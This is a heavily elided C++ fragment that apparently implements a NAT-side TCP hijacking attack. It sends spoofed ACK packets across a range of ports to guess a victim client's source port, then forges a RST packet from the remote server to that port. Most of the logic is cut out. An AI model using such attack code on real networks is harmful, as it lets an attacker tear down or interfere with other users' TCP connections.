            ...
            if (left_ports.size() == 0) {
                ...
                if (left_ports.size() == 1) {
                    ...
                    if (port_to_count[temp_port] >= 3) {
                        ...
                        EthernetII rst_pkt = EthernetII(router_mac_address, self_mac_address) / IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
...
int main(int argc, char** argv)
{
    ...
    router_wan_ip = IPv4Address(argv[4]);
    packet_iface = argv[5];
    ...
    for (int i = 0; i < end_port - start_port ; i++) {
        ack_pkts[i] = IP(router_wan_ip, remote_server_ip) / TCP(start_port + i, remote_server_port);
